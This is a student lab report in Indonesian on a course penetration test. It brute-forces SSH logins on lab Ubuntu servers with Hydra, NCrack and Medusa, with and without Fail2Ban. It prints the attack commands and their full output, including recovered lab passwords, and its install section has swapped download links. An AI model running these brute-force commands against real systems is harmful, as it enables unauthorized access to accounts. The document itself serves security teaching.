# Perancangan Keamanan Sistem Jaringan (PKSJ)- Tugas 1

> Tugas 1 pada Mata Kuliah PKSJ ini adalah melakukan pen test [Penetration Testing](https://en.wikipedia.org/wiki/Penetration_test) pada sebuah sistem.
>
> Sistem yang diserang adalah sebuah Ubuntu Server.
>
> Aplikasi yang terlibat: [Hydra](https://github.com/opennota/hydra), [Medusa](http://h.foofus.net/?cat=9), dan [NCrack](https://nmap.org/)
>
> *Semoga bermanfaat!*

## Daftar Isi

- [Dasar Teori](#dasar-teori)
- [Instalasi Aplikasi](#instalasi-aplikasi)
    - [Server](#instalasi-server)
    - [Penetrator](#instalasi-penetrator)
    - [SSH Server](#instalasi-ssh-sever)
- [Eksperimen](#uji-penetrasi)
    - [Uji Eksperimen Menggunakan Hydra](#uji-penetrasi-menggunakan-hydra)
    - [Uji Eksperimen Menggunakan NCrack](#uji-penetrasi-menggunakan-ncrack)
    - [Uji Eksperimen Menggunakan Medusa](#uji-penetrasi-menggunakan-medusa)
- [Kesimpulan](#kesimpulan)

### Pendahuluan


### Dasar Teori


#### Computer Security

Computer Security, yang biasa dikenal juga sebagai Cyber Security dan/atau IT Security, adalah perlindungan pada sebuah sistem komputer dari pencurian atau kerusakan pada hardware, software, maupun informasi yang dimiliki, serta menghindari adanya gangguan ataupun alih-fungsi pada service yang tersedia.


#### Penetration Testing

Penetration Testing adalah metode untuk mengevaluasi keamanan sistem komputer atau jaringan dengan mensimulasikan serangan dari sumber yang berbahaya. Proses ini melibatkan analisis aktif terhadap sistem untuk setiap kerentanan potensial yang diakibatkan oleh sistem yang lemah atau konfigurasi sistem yang tidak benar atau kelemahan operasional dalam proses teknis. Masalah keamanan yang ditemukan akan disampaikan kepada pemilik sistem bersama dengan penilaian dampak dan mitigasi (solusi teknis) dari setiap kerentanan yang ditemukan.
Tujuan Penetration Testing diantaranya adalah untuk menentukan dan mengetahui serangan-serangan yang bisa terjadi terhadap kerentanan yang ada pada sistem, mengetahui dampak bisnis yang diakibatkan dari hasil ekpoitasi yang dilakukan oleh penyerang. Penetration Testing adalah salah satu komponen penting dari *Security Measures*.


### Vulnerabilities

Proses dari Penetration Testing dibagi menjadi 2:
1. Vulnerabilites Discovery - Operasi-operasi yang seharusnya berjalan normal, yang mana tester dapat melakukan uji coba melakukan kegiatan yang dianggap tidak sesuai.
2. Vulnerabilities Exploitation - Operasi-operasi ilegal yang dilakukan dan berjalan lancar akan dijadikan sasaran penyerangan


##Instalasi Aplikasi

Di bawah ini akan dijelaskan bagaimana melakukan eksperimen dengan pertama-tama melakukan instalasi aplikasi yang dibutuhkan.

### Instalasi Server
* Pada eksperimen kali ini kita menggunakan [Ubuntu Server](https://www.ubuntu.com/download/server?).
* Download Ubuntu Server. Pada percobaan kami, kami memilih Ubuntu Server 16.04.
* Persiapkan Bootable USB untuk melakukan instalasi. Pada percobaan kami, kami menggunakan [Rufus](https://rufus.akeo.ie/).
* Pada saat komputer melakukan booting pilih media USB dimana OS Ubuntu Server diletakkan. Pilih bahasa dan Enter.
* Selanjutnya pilih **Install Ubuntu Server**.
* Pilih bahasa yang hendak digunakan pada saat proses instalasi dan bahasa yang akan digunakan sebagai bahasa default OS.
* Pilih **Continent**, lalu **Country** yang sesuai dengan lokasi Anda saat ini.




### Instalasi Penetrator
* Download file instalasi [Kali Linux](https://www.kali.org/downloads/). Pada percobaan kami, kami mengguanakan kali sebagai OS untuk penetrasi.
* Persiapkan bootable USB. Pada percobaan kami, kami menggunakan [Rufus](https://"linkrufus").
* Lakukan reboot dan masuk ke bios dengan menekan tombol F2
* Kemudian atur urutan pilihan perangkat yang akan digunakan untuk melakukan boot. Dalam hal ini, pilihlah flashdisk yang telah dipersiapkan. Kemudian tekan F10 untuk menyimpan dan melanjutkan proses instalasi.
* Ketika halaman boot kali muncul, pilih instalasi kali.
* Atur bahasa yang akan digunakan.
* Pilih negara tempat kita berada sekarang. Beberapa pilihan negara telah tersedia untuk langsung dipilih. Namun untuk Indonesia, harus memilih `other` > `Asia` > `Indonesia`.
* Atur country country base setting ke `United States - en_US.UTF-8`.
* Atur keymap yang digunakan menjadi `American English`.
* Tentukan hostname dan domain yang akan digunakan. Domain bisa dikosongkan jika tidak diperlukan.
* Tentukan password yang akan digunakan.
* Pilih zona waktu yang digunakan. Kami memilih untuk menggunakan `Central (Sulawesi, Bali, Nusa Tenggara, East and South Kalimantan)`.
* Mengatur partisi yang akan digunakan. Pilih `manual` agar bisa mengatur partisi sesuai keinginan. Kemudian pilih partisi yang akan digunakan. Agar mudah, pilih `Use entire disk`, kemudian pilih konfigurasi otomatis.
* Pilih `All file in one partition`.
* Pilih `finish partitioning and write changes to disk` untuk menyelesaikan pengaturan partisi.

Dalam Kali, ada banyak sekali aplikasi untuk melakukan penyerangan yang telah terinstall. Namun kami akan tetap memberikan cara untuk melakukan instalasi aplikasi yang digunakan dalam pengujian ini. Langkah-langkah menginstall aplikasi yang digunakan untuk Penetration Testing.

#### Instalasi Hydra

Untuk melakukan instalasi Hydra, cukup download file tar.gz yang dibutuhkan dan lakukan ekstraksi seperti biasa.

```bash
wget https://nmap.org/ncrack/dist/ncrack-0.5.tar.gz
./configure
make
make install
```

#### Instalasi NCrack

Untuk melakukan instalasi NCrack, cukup download file tar.gz yang dibutuhkan dan lakukan ekstraksi seperti biasa.

```bash
wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz
./configure
make
make install
```

#### Instalasi Medusa

Untuk melakukan instalasi Medusa, cukup download file tar.gz yang dibutuhkan dan lakukan ekstraksi seperti biasa.

```bash
wget http://www.foofus.net/jmk/tools/medusa-2.0.tar.gz
./configure
make
make install
```

### Instalasi SSH Server

+ Untuk menginstall aplikasi OpenSSH server dan aplikasi yang terkait, jalankan kode:

```bash
sudo apt install openssh-server
```

+ Untuk mengonfigurasi OpenSSH, kita dapat melakukan modifikasi melalui file ` /etc/ssh/sshd_config`. Untuk informasi lebih detail mengenai apa saja yang bisa diedit dari file konfigurasi ini, bisa melihat petunjuk pada file tersebut, dengan menjalankan,


```bash
man sshd_config
```

Dibawah ini adalah contoh konfigurasi yang bisa dimodifikasi sesuai kebutuhan.

* Untuk mengatur supaya OpenSSH menggunakan Port 2222 sebagai ganti dari default TCP Port 22, cari baris konfigurasi berikut ini

```bash
Port 2222
```

dan ganti ke

```bash
Port 22
```



### Uji Penetrasi

#### Uji Penetrasi 1

Uji penetrasi 1 ini akan dilakukan dengan 3 aplikasi brute force attack yaitu Hydra, Ncrack, dan Medusa. Target yang akan digunakan adalah sebuah komputer dengan sistem operasi Ubuntu Server. Konfigurasi SSH yang digunakan adalah konfigurasi default. Berikut adalah percobaan yang telah kami lakukan.

Dalam melakukan penetration test ini, kita bisa menggunakan sebuah password yang ingin ditebak, sebuah dictionary password, ataupun men-generate semua kemungkinan password yang bisa digunakan. Namun jika melakukan generate semua kemungkinan password, akan sangat banyak sekali percobaan yang akan dilakukan serta akan menghabiskan waktu yang sangat lama. Oleh karena itu, kami menggunakan dictionary password yang telah kami buat sebelumnya dengan menggunakan Crunch ditambah sebuah password yang benar didalamnya.

##### Uji Penetrasi Menggunkan Hydra

Hydra memungkinkan kita untuk mengatur jumlah task yang akan digunakan ketika melakukan brute force. Semakin banyak task akan semakin cepat, namun jumlah task yang bisa dijalankan sangat tergantung pada kecepatan internet dan setting SSH yang digunakan. Dengan asumsi kami sudah mengetahui user yang akan diserang dari sebuah komputer, kami mencoba untuk melakukan beberapa test dengan jumlah dictionary yang berbeda-beda. Pertama, kami akan mencoba menebak dengan hanya 5 daftar kata di dictionary. Buka terminal kemudian jalankan command berikut ini.

```bash
hydra -l rafiar -P /root/wordlist.txt -t 5 10.151.32.131 ssh
```

Log hasil eksekusi dari command tersebut pada file berisi 5 menggunakan baris ditambah password asli:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-20 08:40:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking ssh://10.151.32.131:22/
[22][ssh] host: 10.151.32.131   login: rafiar   password: 19102017
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-20 08:40:14
<finished>
```

Lama eksekusi hingga menemukan password: 13 detik. Password ditemukan dengan cepat dan lancar. Kemudian kami mencoba menggunakan dictionary yang terdiri dari 100 baris kata dan melakukan brute force dengan 64 task.

```bash
hydra -l rafiar -P /root/wordlist.txt -t 64 10.151.32.131 ssh
```

Log hasil eksekusi dari command tersebut pada file berisi 100 baris ditambah password asli:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-20 08:23:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 100 login tries (l:1/p:100), ~2 tries per task
[DATA] attacking ssh://10.151.32.131:22/
[22][ssh] host: 10.151.32.131   login: rafiar   password: 19102017
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 36 final worker threads did not complete until end.
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-20 08:24:05
<finished>

[ERROR] 36 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
```

Lama eksekusi hingga menemukan password: 15 detik. Jumlah task yang berhasil digunakan hanya sebanyak 28 task dari total 64 task yang telah ditentukan. Untuk berkutnya, kami mencoba 2000 baris dictionary dengan jumlah task 64.

```bash
hydra -l rafiar -P /root/wordlist.txt -t 64 10.151.32.131 ssh
```

Log hasil eksekusi dari command tersebut pada file berisi 2000 baris ditambah password asli:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-20 08:32:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 2000 login tries (l:1/p:2000), ~32 tries per task
[DATA] attacking ssh://10.151.32.131:22/
[STATUS] 942.00 tries/min, 942 tries in 00:01h, 1114 to do in 00:02h, 64 active
[ERROR] ssh target does not support password auth
[STATUS] 918.50 tries/min, 1837 tries in 00:02h, 224 to do in 00:01h, 64 active
[22][ssh] host: 10.151.32.131   login: rafiar   password: 19102017
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 61 final worker threads did not complete until end.
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-20 08:35:17
<finished>

[ERROR] 61 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
```

Lama eksekusi hingga menemukan password: 129 detik.

##### Uji Penetrasi Menggunkan NCrack

Dalam percobaan pertama kami menggunakan sebuah dictionary dengan beberapa baris kemungkinan password. Untuk menjalankan eksekusi pada NCrack, cukup jalankan command di bawah ini:

```bash
ncrack -v --user nafiar -P wordlist.txt ssh://10.151.34.43
```

Log hasil eksekusi dari command tersebut pada file berisi 5 baris ditambah password asli:

```bash
Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-10-21 04:13 UTC

Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
```

Password berhasil ditemukan. Kemudian kami mengulangi kembali percobaan tersebut dengan sebuah dictionary berisi 2000 baris kemungkinan password. Log hasil eksekusi dari command tersebut pada file berisi 2000 baris ditambah password asli seperti berikut:

```bash
# Ncrack 0.5 scan initiated Sat Oct 21 04:16:34 2017 as: ncrack -v --user nafiar -P wordlist.txt -oN hasilNcrack2000line.txt ssh://10.151.34.43 
Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
Discovered credentials for ssh on 10.151.34.43 22/tcp:
10.151.34.43 22/tcp ssh: 'nafiar' 'guenafiar'

# Ncrack done at Sat Oct 21 04:21:22 2017 -- 1 service scanned in 288.00 seconds.
Probes sent: 531 | timed-out: 0 | prematurely-closed: 194
```

Password berhasil ditemukan dalam 288 detik.

##### Uji Penetrasi Menggunkan Medusa

Medusa akan melakukan brute force sambil menampilkan semua proses percobaan yang dilakukan untuk setiap kemungkinan password. Kami menguji Medusa dengan menggunakan dictionary berisi 100 kemungkinan password. Untuk menjalankan eksekusi pada Medusa, cukup jalankan command di bawah ini:

```bash
medusa -u rafiar -P wordlist.txt -h 10.151.32.131 -M ssh
```

Log hasil eksekusi dari command tersebut pada file berisi 100 baris ditambah password asli:

```bash
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111111 (1 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111119 (2 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111110 (3 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111112 (4 of 102 complete)
...
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111272 (99 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111277 (100 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111711 (101 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 19102017 (102 of 102 complete)
ACCOUNT FOUND: [ssh] Host: 10.151.32.131 User: rafiar Password: 19102017 [SUCCESS]
```

Password berhasil ditemukan.

#### Uji Penetrasi 2

Uji Penetrasi 2 dilakukan dengan menggunakan ssh yang telah konfigurasi ulang dan menggunakan aplisi counter measure bernama Fail2Ban. Aplikasi ini akan memblokir untuk sementara komputer-komputer yang gagal mencoba untuk login beberapa kali selama waktu tertentu.

##### Uji Penetrasi Menggunakan Hydra

Karena Fail2Ban akan memblokir komputer penyerang selama beberapa menit, maka kami menggunakan sebuah dictionary yang hanya berisi 10 baris kata dan ditambah 1 password asli agar tidak terlalu memakan waktu lama. Percobaan ini kami lakukan beberapa kali dengan konfigurasi yang sama persis. Log hasil eksekusi setelah dilindungi dengan Fail2Ban:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-23 04:23:37
[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
[DATA] attacking ssh://10.151.34.43:22/
[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
[22][ssh] host: 10.151.34.43   login: nafiar   password: guenafiar
<finished>
```
```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-23 04:26:17
[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
[DATA] attacking ssh://10.151.34.43:22/
[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-23 04:27:43
<finished>
```
```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-23 04:28:47
[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
[DATA] attacking ssh://10.151.34.43:22/
[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-23 04:30:21
<finished>
```

Percobaan berkali-kali dengan menggunakan Hydra tidak selalu memberikan hasil yang baik. Dari tiga kali percobaan tersebut kami hanya berhasil mendapatkan satu hasil yang benar meskipun tidak ada perubahan yang kami lakukan pada konfigurasi SSH ataupun Hydra diantara ketiga percobaan tersebut.

##### Uji Penetrasi Menggunakan NCrack

Kami menggunakan sebuah dictionary yang berisi 30 baris kata dengan sebuah password asli didalamnya. Log hasil eksekusi setelah dilindungi dengan Fail2Ban:

```bash
Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-10-21 05:21 UTC

Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
ssh://10.151.34.43:22 finished.

Discovered credentials for ssh on 10.151.34.43 22/tcp:
10.151.34.43 22/tcp ssh: 'nafiar' 'guenafiar'

Ncrack done: 1 service scanned in 938.97 seconds.
Probes sent: 1382 | timed-out: 1290 | prematurely-closed: 5

Ncrack finished.
```

Proses percobaan tersebut berlangsung dengan lancar meskipun memakan waktu selama 16 menit.



##### Uji Penetrasi Menggunakan Medusa

Pengujian ini dilakukan dengan menggunakan dictionary berisi 10 baris kata. Semua hasil percobaan password akan ditampilkan dalam log. Log hasil eksekusi setelah dilindungi dengan Fail2Ban:

```bash
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111111 (1 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111119 (2 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111110 (3 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111112 (4 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111117 (5 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111191 (6 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111199 (7 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111190 (8 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111192 (9 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111197 (10 of 11 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: guenafiar (11 of 11 complete)
ACCOUNT FOUND: [ssh] Host: 10.151.34.43 User: nafiar Password: guenafiar [SUCCESS]
```

## Kesimpulan

Apliasi Hydra bisa melakukan tugas dengan lebih cepat karena bisa memanfaatkan banyak task dalam proses brute force. Namun penggunaan Hydra akan lebih tidak stabil dibanding dengan aplikasi brute force lainnya. NCrack dan Medusa bisa menjalankan brute force dengan sangat baik tanpa mengalami kegagalan. Namun Medusa akan sedikit lebih lambat dari kedua aplikasi lainnya. 

